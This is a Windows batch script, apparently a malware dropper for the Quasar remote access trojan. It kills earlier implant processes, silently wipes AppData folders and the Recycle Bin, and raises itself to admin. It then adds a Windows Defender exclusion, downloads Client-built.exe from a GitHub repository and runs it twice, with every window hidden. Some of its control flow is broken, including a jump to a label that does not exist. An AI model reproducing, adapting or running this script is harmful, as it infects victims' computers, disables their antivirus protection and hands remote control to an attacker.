@echo off

:: Set paths early
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "SUBDIR=%APPDATA_PATH%\Roaming\SubDir"
set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"

:: If System32.exe exists in SubDir, kill process and delete it
if exist "%SUBDIR%\System32.exe" (
    taskkill /F /IM System32.exe >nul 2>&1
    del /F /Q "%SUBDIR%\System32.exe"
)

:: End "Quasar Client" task if running by window title
taskkill /F /FI "WINDOWTITLE eq Quasar Client" >nul 2>&1

:: Fully clean folder function (hidden, system, read-only files too)
:clean_folder
if exist "%~1" (
    attrib -h -r -s "%~1\*" /S /D >nul 2>&1
    del /f /s /q "%~1\*" >nul 2>&1
    for /d %%D in ("%~1\*") do (
        call :clean_folder "%%D"
    )
    rmdir /s /q "%~1" >nul 2>&1
)
exit /b

:: Delete everything in SubDir and Traces
call :clean_folder "%SUBDIR%"
call :clean_folder "%TRACES_DIR%"

:: Recreate empty folders
mkdir "%SUBDIR%"
mkdir "%TRACES_DIR%"

:: Silent Recycle Bin Wipe
powershell -WindowStyle Hidden -Command "$null = (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"

:: Check internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)

:: Check admin privileges
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Defender Exclusion
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download client build
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"

:: Run client build twice to ensure execution
start "" "%TARGET_FILE%"
start "" "%TARGET_FILE%"

exit


:: By MrAboudi
:: v3
